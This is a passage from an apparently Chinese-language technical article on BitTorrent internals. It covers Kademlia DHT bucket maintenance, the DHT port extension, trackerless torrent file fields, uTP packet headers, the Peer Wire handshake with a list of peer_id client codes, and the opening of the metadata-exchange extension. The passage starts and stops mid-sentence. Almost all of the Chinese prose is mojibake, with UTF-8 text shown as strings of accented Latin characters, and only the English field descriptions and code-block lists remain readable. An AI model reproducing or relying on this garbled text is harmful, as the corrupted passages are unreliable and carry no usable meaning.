ä¸ªæ–°çš„æ¡¶ï¼Œæ¯ä¸ªæ–°æ¡¶çš„èŒƒå›´éƒ½æ˜¯åŸæ¥æ—§æ¡¶çš„ä¸€åŠã€‚åŸæ¥æ—§æ¡¶ä¸­çš„èŠ‚ç‚¹å°†è¢«é‡æ–°åˆ†é…åˆ°è¿™ä¸¤ä¸ªæ–°çš„æ¡¶ä¸­ã€‚å¦‚æœä¸€ä¸ªæ–°è¡¨åªæœ‰ä¸€ä¸ªæ¡¶ï¼Œè¿™ä¸ªåŒ…å«æ•´ä¸ªèŒƒå›´çš„æ¡¶å°†æ€»è¢«åˆ†è£‚ä¸º 2 ä¸ªæ–°çš„æ¡¶ï¼Œæ¯ä¸ªæ¡¶çš„è¦†ç›–èŒƒå›´ä» 0..2^159 å’Œ 2^159..2^160  ä»¥log2Nçš„æ–¹å¼ä¸æ–­åˆ†è£‚ï¼Œç±»ä¼¼äºKademliaä¸­çš„Kæ¡¶æœºåˆ¶\n\n6. å½“æ¡¶è£…æ»¡äº†å¥½èŠ‚ç‚¹ï¼Œæ–°çš„èŠ‚ç‚¹ä¼šè¢«ä¸¢å¼ƒã€‚ä¸€æ—¦æ¡¶ä¸­çš„æŸä¸ªèŠ‚ç‚¹å˜ä¸ºäº†åçš„èŠ‚ç‚¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ç”¨æ–°çš„èŠ‚ç‚¹æ¥æ›¿æ¢è¿™ä¸ªåçš„èŠ‚ç‚¹ã€‚å¦‚æœæ¡¶ä¸­æœ‰åœ¨ 15 åˆ†é’Ÿå†…éƒ½æ²¡æœ‰æ´»è·ƒè¿‡çš„èŠ‚ç‚¹ï¼Œæˆ‘ä»¬å°†è¿™æ ·çš„èŠ‚ç‚¹è§†ä¸ºå¯ç–‘çš„èŠ‚ç‚¹ï¼Œè¿™æ—¶æˆ‘ä»¬å‘æœ€ä¹…æ²¡æœ‰è”ç³»çš„èŠ‚ç‚¹å‘é€ pingã€‚å¦‚æœè¢« ping çš„èŠ‚ç‚¹ç»™å‡ºäº†å›å¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å‘ä¸‹ä¸€ä¸ªå¯ç–‘çš„èŠ‚ç‚¹å‘é€ pingï¼Œä¸æ–­è¿™æ ·å¾ªç¯ä¸‹å»ï¼Œç›´åˆ°æœ‰æŸä¸€ä¸ªèŠ‚ç‚¹æ²¡æœ‰ç»™å‡º ping çš„å›å¤ï¼Œæˆ–è€…å½“å‰æ¡¶ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½æ˜¯å¥½çš„(ä¹Ÿå°±æ˜¯æ‰€æœ‰èŠ‚ç‚¹éƒ½ä¸æ˜¯å¯ç–‘èŠ‚ç‚¹ï¼Œä»–ä»¬åœ¨è¿‡å» 15 åˆ†é’Ÿå†…éƒ½æœ‰æ´»åŠ¨)ã€‚å¦‚æœæ¡¶ä¸­çš„æŸä¸ªèŠ‚ç‚¹æ²¡æœ‰å¯¹æˆ‘ä»¬çš„ ping ç»™å‡ºå›å¤ï¼Œæˆ‘ä»¬æœ€å¥½å†è¯•ä¸€æ¬¡(å†å‘é€ä¸€æ¬¡ pingï¼Œå› ä¸ºè¿™ä¸ªèŠ‚ç‚¹ä¹Ÿè®¸ä»ç„¶æ˜¯æ´»è·ƒçš„ï¼Œä½†ç”±äºç½‘ç»œæ‹¥å¡ï¼Œæ‰€ä»¥å‘ç”Ÿäº†ä¸¢åŒ…ç°è±¡ï¼Œæ³¨æ„ DHT çš„åŒ…éƒ½æ˜¯ UDP çš„)ï¼Œè€Œä¸æ˜¯ç«‹å³ä¸¢å¼ƒè¿™ä¸ªèŠ‚ç‚¹æˆ–è€…ç›´æ¥ç”¨æ–°èŠ‚ç‚¹æ¥æ›¿ä»£å®ƒã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å¾—è·¯ç”±è¡¨å°†å……æ»¡ç¨³å®šçš„é•¿æ—¶é—´åœ¨çº¿çš„èŠ‚ç‚¹ \n\n7. æ¯ä¸ªæ¡¶éƒ½åº”è¯¥ç»´æŒä¸€ä¸ª lastchange å­—æ®µæ¥è¡¨æ˜æ¡¶ä¸­èŠ‚ç‚¹çš„\"æ–°é²œ\"åº¦ã€‚å½“æ¡¶ä¸­çš„èŠ‚ç‚¹è¢« ping å¹¶ç»™å‡ºäº†å›å¤ï¼Œæˆ–è€…ä¸€ä¸ªèŠ‚ç‚¹è¢«åŠ å…¥åˆ°äº†æ¡¶ï¼Œæˆ–è€…ä¸€ä¸ªèŠ‚ç‚¹è¢«æ–°çš„èŠ‚ç‚¹æ‰€æ›¿ä»£ï¼Œæ¡¶çš„ lastchange å­—æ®µéƒ½åº”å½“è¢«æ›´æ–°ã€‚å¦‚æœä¸€ä¸ªæ¡¶çš„ lastchange åœ¨è¿‡å»çš„ 15 åˆ†é’Ÿå†…éƒ½æ²¡æœ‰å˜åŒ–ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†æ›´æ–°å®ƒã€‚è¿™ä¸ªæ›´æ–°æ¡¶æ“ä½œæ˜¯è¿™æ ·å®Œæˆçš„\n\n\t+ ä»è¿™ä¸ªæ¡¶æ‰€è¦†ç›–çš„èŒƒå›´ä¸­éšæœºé€‰æ‹©ä¸€ä¸ª IDï¼Œå¹¶å¯¹è¿™ä¸ª ID æ‰§è¡Œ find_nodes æŸ¥æ‰¾æ“ä½œã€‚\n\t+ å¸¸å¸¸æ”¶åˆ°è¯·æ±‚çš„èŠ‚ç‚¹é€šå¸¸ä¸éœ€è¦å¸¸å¸¸æ›´æ–°è‡ªå·±çš„æ¡¶, åä¹‹ï¼Œä¸å¸¸å¸¸æ”¶åˆ°è¯·æ±‚çš„èŠ‚ç‚¹å¸¸å¸¸éœ€è¦å‘¨æœŸæ€§çš„æ‰§è¡Œæ›´æ–°æ‰€æœ‰æ¡¶çš„æ“ä½œï¼Œè¿™æ ·æ‰èƒ½ä¿è¯å½“æˆ‘ä»¬ç”¨åˆ° DHT çš„æ—¶å€™ï¼Œé‡Œé¢æœ‰è¶³å¤Ÿå¤šçš„å¥½çš„èŠ‚ç‚¹ \n\n8. åœ¨æ’å…¥ç¬¬ä¸€ä¸ªèŠ‚ç‚¹åˆ°è·¯ç”±è¡¨å¹¶å¯åŠ¨æœåŠ¡åï¼Œè¿™ä¸ªèŠ‚ç‚¹åº”è¯•ç€æŸ¥æ‰¾ DHT ä¸­ç¦»è‡ªå·±æ›´è¿‘çš„èŠ‚ç‚¹ï¼Œè¿™ä¸ªæŸ¥æ‰¾å·¥ä½œæ˜¯é€šè¿‡ä¸æ–­çš„å‘å‡º find_node æ¶ˆæ¯ç»™è¶Šæ¥è¶Šè¿‘çš„èŠ‚ç‚¹æ¥å®Œæˆçš„ï¼Œå½“ä¸èƒ½æ‰¾åˆ°æ›´è¿‘çš„èŠ‚ç‚¹æ—¶ï¼Œè¿™ä¸ªæ‰©æ•£å·¥ä½œå°±ç»“æŸäº†\n\n9. è·¯ç”±è¡¨åº”å½“è¢«å¯åŠ¨å·¥ä½œå’Œå®¢æˆ·ç«¯è½¯ä»¶ä¿å­˜(ä¹Ÿå°±æ˜¯å¯åŠ¨çš„æ—¶å€™ä»å®¢æˆ·ç«¯ä¸­è¯»å–è·¯ç”±è¡¨ä¿¡æ¯ï¼Œç»“æŸçš„æ—¶å€™å®¢æˆ·ç«¯è½¯ä»¶è®°å½•åˆ°æ–‡ä»¶ä¸­)\n\n\n### 0x2: BitTorrent åè®®æ‰©å±• BitTorrent Protocol Extension\n\n\nBitTorrent åè®®å·²ç»è¢«æ‰©å±•ä¸ºå¯ä»¥åœ¨é€šè¿‡ tracker å¾—åˆ°çš„ peer ä¹‹é—´äº’ç›¸äº¤æ¢èŠ‚ç‚¹çš„ UDP ç«¯å£å·(ä¹Ÿå°±æ˜¯å‘Šè¯‰å¯¹æ–¹æˆ‘ä»¬çš„ DHT æœåŠ¡ç«¯å£å·)ï¼Œåœ¨è¿™æ ·çš„æ–¹å¼ä¸‹ï¼Œå®¢æˆ·ç«¯å¯ä»¥é€šè¿‡ä¸‹è½½æ™®é€šçš„ç§å­æ–‡ä»¶æ¥è‡ªåŠ¨æ‰©å±• DHT è·¯ç”±è¡¨(æˆ‘ç›´æ¥çŸ¥é“æŸä¸ªèŠ‚ç‚¹æœ‰æŸä¸€ä¸ªèµ„æº)ã€‚æ–°å®‰è£…çš„å®¢æˆ·ç«¯ç¬¬ä¸€æ¬¡è¯•ç€ä¸‹è½½ä¸€ä¸ªæ—  tracker çš„ç§å­æ—¶ï¼Œå®ƒçš„è·¯ç”±è¡¨ä¸­å°†æ²¡æœ‰ä»»ä½•èŠ‚ç‚¹ï¼Œè¿™æ˜¯å®ƒéœ€è¦åœ¨ torrent æ–‡ä»¶ä¸­æ‰¾åˆ°è”ç³»ä¿¡æ¯\n\n\n1. peers å¦‚æœæ”¯æŒ DHT åè®®å°±å°† BitTorrent åè®®æ¡æ‰‹æ¶ˆæ¯çš„ä¿ç•™ä½çš„ç¬¬ 8 å­—èŠ‚çš„æœ€åä¸€ä½ç½®ä¸º 1\n2. è¿™æ—¶å¦‚æœ peer æ”¶åˆ°ä¸€ä¸ª handshake è¡¨æ˜å¯¹æ–¹æ”¯æŒ DHT åè®®ï¼Œå°±åº”è¯¥å‘é€ PORT æ¶ˆæ¯ã€‚å®ƒç”±å­—èŠ‚ 0x09 å¼€å§‹ï¼Œpayload çš„é•¿åº¦æ˜¯ 2 ä¸ªå­—èŠ‚ï¼ŒåŒ…å«äº†è¿™ä¸ª peer çš„ DHT æœåŠ¡ä½¿ç”¨çš„ç½‘ç»œå­—èŠ‚åºçš„ UDP ç«¯å£å·\n3. å½“ peer æ”¶åˆ°è¿™æ ·çš„æ¶ˆæ¯æ—¶åº”å½“å‘å¯¹æ–¹çš„ IP å’Œæ¶ˆæ¯ä¸­æŒ‡å®šçš„ç«¯å£å·çš„èŠ‚ç‚¹å‘é€ ping\n4. å¦‚æœæ”¶åˆ°äº† ping çš„å›å¤ï¼Œé‚£ä¹ˆåº”å½“ä½¿ç”¨ä¸Šè¿°çš„æ–¹æ³•å°†æ–°èŠ‚ç‚¹çš„è”ç³»ä¿¡æ¯åŠ å…¥åˆ°è·¯ç”±è¡¨ä¸­ \n\n### 0x3: Torrent æ–‡ä»¶æ‰©å±• Torrent File Extensions(ç§å­æ–‡ä»¶)\n\nä¸€ä¸ªæ—  tracker çš„ torrent æ–‡ä»¶å­—å…¸ä¸åŒ…å« announce å…³é”®å­—ï¼Œè€Œä½¿ç”¨ nodes å…³é”®å­—æ¥æ›¿ä»£ã€‚è¿™ä¸ªå…³é”®å­—å¯¹åº”çš„å†…å®¹åº”è¯¥è®¾ç½®ä¸º torrent åˆ›å»ºè€…çš„è·¯ç”±è¡¨ä¸­ K ä¸ªæœ€æ¥è¿‘çš„èŠ‚ç‚¹(å¯ä¾›é€‰æ‹©çš„)ï¼Œè¿™ä¸ªå…³é”®å­—ä¹Ÿå¯ä»¥è®¾ç½®ä¸ºä¸€ä¸ªå·²çŸ¥çš„å¯ç”¨èŠ‚ç‚¹(è¿™æ„å‘³ç€æ¥æ”¶åˆ°è¿™ä¸ªç§å­æ–‡ä»¶çš„å®¢æˆ·ç«¯èƒ½å¤Ÿå‘è¿™äº›èŠ‚ç‚¹å‘å‡ºè§£æè¯·æ±‚ï¼Œè¯¢é—®èµ„æºçš„æ‰€åœ¨ä½ç½®)ï¼Œæ¯”å¦‚è¿™ä¸ª torrent æ–‡ä»¶çš„åˆ›å»ºè€….\n\nè¯·ä¸è¦è‡ªåŠ¨åŠ å…¥ router.bittorrent.com åˆ° torrent æ–‡ä»¶ä¸­æˆ–è€…è‡ªåŠ¨åŠ å…¥è¿™ä¸ªèŠ‚ç‚¹åˆ°å®¢æˆ·ç«¯è·¯ç”±è¡¨ä¸­ã€‚è¿™é‡Œå¯ä»¥ä»”ç»†æ€è€ƒä¸€ä¸‹ï¼Œè¿™ä¹ˆåšè¿˜æœ‰å¦ä¸€ä¸ªå¥½å¤„ï¼Œè¿™ä¸ªå¯¹ç­‰ç½‘ç»œå¯ä»¥ä¿æŒæ— ä¸­å¿ƒåŒ–ï¼Œå¯¹äºå¤–éƒ¨æ–°åŠ å…¥çš„æ–°èŠ‚ç‚¹æ¥è¯´ï¼Œå®ƒå¯ä»¥ä¸ç”¨é€šè¿‡\"ä¸­å¿ƒå¼•å¯¼èŠ‚ç‚¹\"æ¥åŠ å…¥ç½‘ç»œï¼Œéšè—äº†\"ä¸­å¿ƒå¼•å¯¼èŠ‚ç‚¹\"çš„å­˜åœ¨ï¼Œå¢å¼ºäº†å¯¹ç­‰ç½‘ç»œçš„éšè”½æ€§\n\n\nbt ç§å­æ–‡ä»¶æ˜¯ä½¿ç”¨ bencode ç¼–ç çš„ï¼Œæ•´ä¸ªæ–‡ä»¶å°± dictionaryï¼ŒåŒ…å«ä»¥ä¸‹é”®\n\n```\n1. info(dictinary): å¿…é€‰, è¡¨ç¤ºè¯¥btç§å­æ–‡ä»¶çš„æ–‡ä»¶ä¿¡æ¯ \n    1) æ–‡ä»¶ä¿¡æ¯åŒ…æ‹¬æ–‡ä»¶çš„å…¬å…±éƒ¨åˆ†\n        1.1) piece length(integer): å¿…é€‰, æ¯ä¸€æ•°æ®å—çš„é•¿åº¦\n        1.2) pieces(string): å¿…é€‰, æ‰€æœ‰æ•°æ®å—çš„ SHA1 æ ¡éªŒå€¼\n        1.3) publisher(string):    å¯é€‰, å‘å¸ƒè€…\n        1.4) publisher.utf-8(string): å¯é€‰, å‘å¸ƒè€…çš„ UTF-8 ç¼–ç \n        1.5) publisher-url(string): å¯é€‰, å‘å¸ƒè€…çš„ URL\n        1.6) publisher-url.utf-8(string): å¯é€‰, å‘å¸ƒè€…çš„ URL çš„ UTF-8 ç¼–ç \n    2) å¦‚æœ bt ç§å­åŒ…å«çš„æ˜¯å•ä¸ªæ–‡ä»¶ï¼ŒåŒ…å«ä»¥ä¸‹å†…å®¹\n        2.1) name(string): å¿…é€‰, æ¨èçš„æ–‡ä»¶åç§°\n        2.2) name.utf-8(string): å¯é€‰, æ¨èçš„æ–‡ä»¶åç§°çš„ UTF-8 ç¼–ç \n        2.3) length(int): å¿…é€‰ï¼Œæ–‡ä»¶çš„é•¿åº¦å•ä½æ˜¯å­—èŠ‚\n    3) å¦‚æœæ˜¯å¤šæ–‡ä»¶ï¼Œåˆ™åŒ…å«ä»¥ä¸‹éƒ¨åˆ†:\n        3.1) name(string): å¿…é€‰, æ¨èçš„æ–‡ä»¶å¤¹åç§°\n        3.2) name.utf-8(string): å¯é€‰, æ¨èçš„æ–‡ä»¶åç§°çš„ UTF-8 ç¼–ç \n        3.3) files(list): å¿…é€‰, æ–‡ä»¶åˆ—è¡¨ï¼Œæ¯ä¸ªæ–‡ä»¶åˆ—è¡¨ä¸‹é¢æ˜¯åŒ…æ‹¬æ¯ä¸€ä¸ªæ–‡ä»¶çš„ä¿¡æ¯ï¼Œæ–‡ä»¶ä¿¡æ¯æ˜¯ä¸ªå­—å…¸ \n    4) æ–‡ä»¶å­—å…¸\n        4.1) length(int): å¿…é€‰ï¼Œæ–‡ä»¶çš„é•¿åº¦å•ä½æ˜¯å­—èŠ‚\n        4.2) path(string): å¿…é€‰ï¼Œæ–‡ä»¶åç§°ï¼ŒåŒ…å«æ–‡ä»¶å¤¹åœ¨å†…\n        4.3) path.utf-8(string): å¿…é€‰ï¼Œæ–‡ä»¶åç§° UTF-8 è¡¨ç¤ºï¼ŒåŒ…å«æ–‡ä»¶å¤¹åœ¨å†…\n        4.4) filehas(string): å¯é€‰ï¼Œæ–‡ä»¶hash\n        4.5) ed2k(string): å¯é€‰, ed2k ä¿¡æ¯ \n\n2. announce(string): å¿…é€‰, tracker æœåŠ¡å™¨çš„åœ°å€\n3. announce-list(list): å¯é€‰, å¯é€‰çš„ tracker æœåŠ¡å™¨åœ°å€\n4. creation date(interger): å¿…é€‰, æ–‡ä»¶åˆ›å»ºæ—¶é—´\n5. comment(string): å¯é€‰, bt æ–‡ä»¶æ³¨é‡Š\n6. created by(string): å¯é€‰ï¼Œæ–‡ä»¶åˆ›å»ºè€…\n```\n\n<font color=\"red\">piecesæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒçš„é•¿åº¦æ˜¯20çš„å€æ•°ï¼Œæ¯ä¸€æ®µ20ä¸ªå­—ç¬¦è¡¨ç¤ºå¯¹åº”æ–‡ä»¶å—çš„sha1 hashå€¼ã€‚</font>\n\n\n\n\nè¿™é‡Œè¦ç‰¹åˆ«æ³¨æ„ä¸€ç‚¹ï¼šç£åŠ›é“¾æ¥çš„infohashä¹Ÿæ˜¯æ ¹æ®infoå­—æ®µæ¥è®¡ç®—çš„ï¼Œinfoå­—æ®µçš„piecesä¸ºæ¯ä¸ªæ•°æ®å—çš„æ ¡éªŒå€¼ï¼Œå…¶ä½œç”¨æ˜¯éªŒè¯ä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶æ˜¯å¦æ­£ç¡®ï¼Œå¦‚æœä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶å—è®¡ç®—å‡ºæ¥çš„SHA1å€¼å’Œpiecesä¸­çš„SHA1æ ¡éªŒå€¼ä¸ä¸€è‡´ï¼Œè¯¥æ•°æ®å—è¦é‡æ–°ä¸‹è½½ã€‚ æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ ¹æ®ç£åŠ›é“¾æ¥ä¸‹è½½æ–‡ä»¶æ˜¯åˆ†æˆä¸¤ä¸ªæ­¥éª¤çš„\n\n1. å…ˆæ ¹æ®infohashä¸‹è½½ç§å­æ–‡ä»¶çš„infoå­—æ®µï¼Œç§å­æ–‡ä»¶å¹¶ä¸æ˜¯å¿…é¡»çš„ï¼Œä½†æ˜¯infoå­—æ®µå´å¿…ä¸å¯å°‘\n2. ç„¶åæ ¹æ®infohashä¸‹è½½æºæ–‡ä»¶ï¼Œå°†ä¸‹è½½çš„æ¯ä¸€ä¸ªæ•°æ®å—å’Œinfoä¸­çš„å¯¹åº”çš„SHA1æ ¡éªŒç è¿›è¡Œæ¯”è¾ƒï¼Œä¸ä¸€è‡´é‡æ–°ä¸‹è½½è¯¥æ•°æ®å—\n\néœ€è¦æ³¨æ„çš„æ˜¯\n\n1. ä¸€èˆ¬çš„ç§å­æ–‡ä»¶ä¼šåŒ…å«announceï¼Œä¹Ÿå°±æ˜¯trackeræœåŠ¡å™¨çš„åœ°å€(trackerlessæ˜¯BTTorrentçš„è¶‹åŠ¿)\n2. å¦‚æœæ²¡æœ‰trackeræœåŠ¡å™¨ï¼Œæ–‡ä»¶ä¸­å¯èƒ½ä¼šåŒ…å«nodesï¼Œnodesæ˜¯å­˜æœ‰ç§å­ä¿¡æ¯çš„peerèŠ‚ç‚¹ï¼Œè¿™æ ·çš„ç§å­æ–‡ä»¶å°±æ˜¯trackerless torrentã€‚å¦‚æœæœ‰nodeså®¢æˆ·ç«¯ç›´æ¥ä»nodesè·å–ç§å­ä¿¡æ¯\n3. <font color=\"red\">è€Œä»DHTç½‘ç»œä¸­ä¸‹è½½ä¸‹æ¥çš„ç§å­æ–‡ä»¶æ—¢æ²¡æœ‰annouceä¹Ÿæ²¡æœ‰nodesï¼Œå®¢æˆ·ç«¯åªèƒ½é€šè¿‡infoå­—æ®µè®¡ç®—å‡ºhashinfoï¼Œå†ä»bootstrap nodeèŠ‚ç‚¹å¼€å§‹åœ¨DHTç½‘ç»œä¸­å¯»æ‰¾ç§å­ä¿¡æ¯</font>\n\n\nBTåŸç”Ÿä¾é Trackerï¼Œåæ¥æ‰åŠ å…¥dht\n\n\n# 4. uTPåè®® \n\nuTPåè®®æ˜¯ä¸€ä¸ªåŸºäºUDPçš„å¼€æ”¾çš„BTç‚¹å¯¹ç‚¹æ–‡ä»¶å…±äº«åè®®ã€‚åœ¨uTPåè®®å‡ºç°ä¹‹å‰ï¼ŒBTä¸‹è½½ä¼šå ç”¨ç½‘ç»œä¸­å¤§é‡çš„é“¾æ¥ï¼Œç›´æ¥å¯¼è‡´å…¶å®ƒç½‘ç»œåº”ç”¨æœåŠ¡è´¨é‡ä¸‹è½½å’Œç½‘ç»œçš„æ‹¥å µï¼Œå› æ­¤æœ‰å¾ˆå¤šISPéƒ½å¼€å§‹é™åˆ¶BTçš„ä¸‹è½½ã€‚uTPå‡è½»äº†ç½‘ç»œå»¶è¿Ÿå¹¶è§£å†³äº†ä¼ ç»Ÿçš„åŸºäºTCPçš„BTåè®®æ‰€é‡åˆ°çš„æ‹¥å¡æ§åˆ¶é—®é¢˜ï¼Œæä¾›å¯é çš„æœ‰åºçš„ä¼ é€ã€‚ä¸€ä¸ªæœ‰æ•ˆçš„uTPæ•°æ®åŒ…åŒ…å«ä¸‹é¢æ ¼å¼çš„æŠ¥å¤´\n\n![1](Kademlia_DHT_KRPC_BitTorrentåè®®/2.png)\n\n\n1. type(åŒ…ç±»å‹):\n\n\t```\n    1) ST_DATA = 0: æœ€é‡è¦çš„æ•°æ®åŒ…ï¼ŒuTPå°±æ˜¯ä½¿ç”¨è¯¥ç±»å‹çš„åŒ…ä¼ é€æ•°æ®\n    2) ST_FIN = 1: å…³é—­è¿æ¥ï¼Œè¿™æ˜¯uTPè¿æ¥çš„æœ€åä¸€ä¸ªåŒ…ï¼Œç±»ä¼¼äºTCPä¸­çš„FIN\n    3) ST_STATE = 2: ç®€å•çš„åº”ç­”åŒ…ï¼Œè¡¨æ˜å·²ä»å¯¹æ–¹æ”¶åˆ°äº†æ•°æ®åŒ…ï¼Œè¯¥åŒ…ä¸åŒ…å«ä»»ä½•æ•°æ®ï¼Œseq_nrå€¼ä¸å˜\n    4) ST_RESET = 3: ç»ˆæ­¢è¿æ¥ï¼Œç±»ä¼¼äºTCPä¸­çš„RST\n    5) ST_SYN = 4: åˆå§‹åŒ–è¿æ¥ï¼Œç±»ä¼¼äºTCPä¸­çš„SYNï¼Œè¿™æ˜¯uTPè¿æ¥çš„ç¬¬ä¸€ä¸ªåŒ…\n\t```\n2. ver: This is the protocol version. The current version is 1.\n3. extension: The type of the first extension in a linked list of extension headers. \n  \n    ```\n    1) 0 means no extension.\n    2) Selective acks: There is currently one extension:\n\t```\n\n4. `connection_id`: This is a random, unique, number identifying all the packets that belong to the same connection. Each socket has one connection ID for sending packets and a different connection ID for receiving packets. The endpoint initiating the connection decides which ID to use, and the return path has the same ID + 1.    \n\n\tuTPçš„ä¸€ä¸ªå¾ˆé‡è¦çš„ç‰¹ç‚¹æ˜¯ä½¿ç”¨connection idæ¥æ ‡è¯†ä¸€æ¬¡è¿æ¥ï¼Œè€Œä¸æ˜¯æ¯ä¸ªåŒ…ç®—ä¸€æ¬¡è¿æ¥ã€‚æ‰€ä»¥åœ¨åˆ†æST_DATAæ—¶ï¼Œéœ€è¦æ³¨æ„æ‰¾æ‰€æœ‰connection idç›¸åŒçš„æ•°æ®åŒ…ï¼Œç„¶åæŒ‰seq_nræ’åºï¼Œseq_nråº”è¯¥æ˜¯ä¾æ¬¡é€’å¢çš„(æ³¨æ„ST_STATEåŒ…ä¸ä¼šå¢åŠ seq_nrå€¼)ï¼Œå¦‚æœå‘ç°ä¸¤ä¸ªST_DATAçš„seq_nrå€¼ç›¸åŒåˆ™è¯´æ˜åé¢é‚£ä¸ªæŠ¥æ–‡æ˜¯é‡å¤æŠ¥æ–‡éœ€è¦å¿½ç•¥æ‰ï¼Œå¦‚æœå‘ç°ä¸¤ä¸ªST_DATAçš„seq_nrå€¼ä¸æ˜¯è¿ç»­çš„ï¼Œä¸­é—´å·®äº†ä¸€ä¸ªæˆ–å¤šä¸ªï¼Œåˆ™å¯èƒ½æ˜¯ç”±äºç½‘ç»œåŸå› å‘ç”Ÿäº†ä¸¢åŒ…ç°è±¡ï¼Œæ•°æ®åŒ…å°†ä¸å¯ç”¨\n\n5. `timestamp_microseconds`: This is the 'microseconds' parts of the timestamp of when this packet was sent. This is set using gettimeofday() on posix and QueryPerformanceTimer() on windows. The higher resolution this timestamp has, the better. The closer to the actual transmit time it is set, the better.\n\n6. `timestamp_difference_microseconds`: This is the difference between the local time and the timestamp in the last received packet, at the time the last packet was received. This is the latest one-way delay measurement of the link from the remote peer to the local machine. \nWhen a socket is newly opened and doesn't have any delay samples yet, this must be set to 0.\n\n7. wnd_size: Advertised receive window. This is 32 bits wide and specified in bytes. The window size is the number of bytes currently in-flight, i.e. sent but not acked. The advertised receive window lets the other end cap the window size if it cannot receive any faster, if its receive buffer is filling up. When sending packets, this should be set to the number of bytes left in the socket's receive buffer.\n\n8. seq_nr\n9. ack_nr\n\nåœ¨uTPè¿æ¥å»ºç«‹ä¹‹åï¼Œå°±å¼€å§‹ä¼ é€éœ€è¦çš„æ•°æ®äº†ã€‚peerå’Œpeerä¹‹é—´ä¼ é€æ•°æ®ä¹Ÿæ˜¯éµå¾ªç€ä¸€å®šçš„è§„èŒƒï¼Œå°±æ˜¯Peer Wireåè®®ã€‚\n\n\n# 5. Peer Wireåè®® \n\nåœ¨BitTorrentä¸­ï¼ŒèŠ‚ç‚¹çš„å¯»å€æ˜¯é€šè¿‡DHTå®ç°çš„ï¼Œè€Œå®é™…çš„èµ„æºå…±äº«å’Œä¼ è¾“åˆ™éœ€è¦é€šè¿‡uTPä»¥åŠPeer Wireåè®®æ¥é…åˆå®Œæˆ\n\n### 0x1: æ¡æ‰‹\n\nPeer Wireåè®®æ˜¯Peerä¹‹é—´çš„é€šä¿¡åè®®ï¼Œé€šå¸¸ç”±ä¸€ä¸ªæ¡æ‰‹æ¶ˆæ¯å¼€å§‹ã€‚æ¡æ‰‹æ¶ˆæ¯çš„æ ¼å¼æ˜¯è¿™æ ·çš„\n\n```\n<pstrlen><pstr><reserved><info_hash><peer_id> \n```\n\nåœ¨BitTorrentåè®®çš„v1.0ç‰ˆæœ¬, pstrlen = 19, pstr = \"BitTorrent protocol\"ï¼Œinfo_hashæ˜¯ä¸Šæ–‡ä¸­æåˆ°çš„ç£åŠ›é“¾æ¥ä¸­çš„btihï¼Œpeer_idæ¯ä¸ªå®¢æˆ·ç«¯éƒ½ä¸ä¸€æ ·ï¼Œä½†æ˜¯æœ‰ç€ä¸€å®šçš„è§„åˆ™ï¼Œæ ¹æ®å‰é¢å‡ ä¸ªå­—ç¬¦å¯ä»¥æ¨æ–­å‡ºå®¢æˆ·ç«¯çš„ç±»å‹\n\n```\n'AG' - Ares\n'A~' - Ares\n'AR' - Arctic\n'AV' - Avicora\n'AX' - BitPump\n'AZ' - Azureus\n'BB' - BitBuddy\n'BC' - BitComet\n'BF' - Bitflu\n'BG' - BTG (uses Rasterbar libtorrent)\n'BR' - BitRocket\n'BS' - BTSlave\n'BX' - ~Bittorrent X\n'CD' - Enhanced CTorrent\n'CT' - CTorrent\n'DE' - DelugeTorrent\n'DP' - Propagate Data Client\n'EB' - EBit\n'ES' - electric sheep\n'FT' - FoxTorrent\n'FX' - Freebox BitTorrent\n'GS' - GSTorrent\n'HL' - Halite\n'HN' - Hydranode\n'KG' - KGet\n'KT' - KTorrent\n'LH' - LH-ABC\n'LP' - Lphant\n'LT' - libtorrent\n'lt' - libTorrent\n'LW' - LimeWire\n'MO' - MonoTorrent\n'MP' - MooPolice\n'MR' - Miro\n'MT' - MoonlightTorrent\n'NX' - Net Transport\n'PD' - Pando\n'qB' - qBittorrent\n'QD' - QQDownload\n'QT' - Qt 4 Torrent example\n'RT' - Retriever\n'S~' - Shareaza alpha/beta\n'SB' - ~Swiftbit\n'SS' - SwarmScope\n'ST' - SymTorrent\n'st' - sharktorrent\n'SZ' - Shareaza\n'TN' - TorrentDotNET\n'TR' - Transmission\n'TS' - Torrentstorm\n'TT' - TuoTu\n'UL' - uLeecher!\n'UT' - ÂµTorrent\n'VG' - Vagaa\n'WD' - WebTorrent Desktop\n'WT' - BitLet\n'WW' - WebTorrent\n'WY' - FireTorrent\n'XL' - Xunlei\n'XT' - XanTorrent\n'XX' - Xtorrent\n'ZT' - ZipTorrent\n```\n\nPeer Wireåè®®æ˜¯åœ¨uTPåè®®åŸºç¡€ä¸Šé‡Œå±‚åº”ç”¨æ€åè®®ã€‚æ”¶åˆ°æ¡æ‰‹æ¶ˆæ¯åï¼Œå¯¹æ–¹ä¹Ÿä¼šå›å¤ä¸€ä¸ªæ¡æ‰‹æ¶ˆæ¯ï¼Œå¹¶ä¸”å¼€å§‹åå•†ä¸€äº›åŸºæœ¬çš„ä¿¡æ¯ã€‚\n\n\n# 6. BitTorrentåè®®æ‰©å±•ut_metadataå’Œut_pex(Extension for Peers to Send Metadata Files) (ç£åŠ›é“¾æ¥æ ¸å¿ƒ)\n\n```\nBEP:9 \t\tTitle:\tExtension for Peers to Send Metadata Files\nBEP:10 \t\tTitle:\tExtension Protocol\n```\n\n\nå€ŸåŠ©äºDHT/KRPCå®Œæˆäº†çš„NodeèŠ‚ç‚¹å¯»å€ï¼Œèµ„æºå¯¹åº”çš„Peerè·å–ï¼Œä»¥åŠuTPä»¥åŠPeer Wireå®Œæˆæ¡æ‰‹ä¹‹åï¼Œæ¥ä¸‹è¦å°±è¦\"åŠ¨çœŸæ ¼\"äº†ï¼Œæˆ‘ä»¬éœ€è¦è·å–åˆ°ç›®æ ‡èµ„æºçš„\"ç§å­ä¿¡æ¯(infohash/filename/piecesåˆ†å—sha1)\"äº†ï¼Œ<font color=\"red\">è¿™ä¸ªæ‰©å±•çš„ç›®çš„æ˜¯ä¸ºäº†åœ¨æœ€åˆæ²¡æœ‰.torrentæ–‡ä»¶çš„æƒ…å†µä»ç„¶èƒ½å¤ŸåŠ 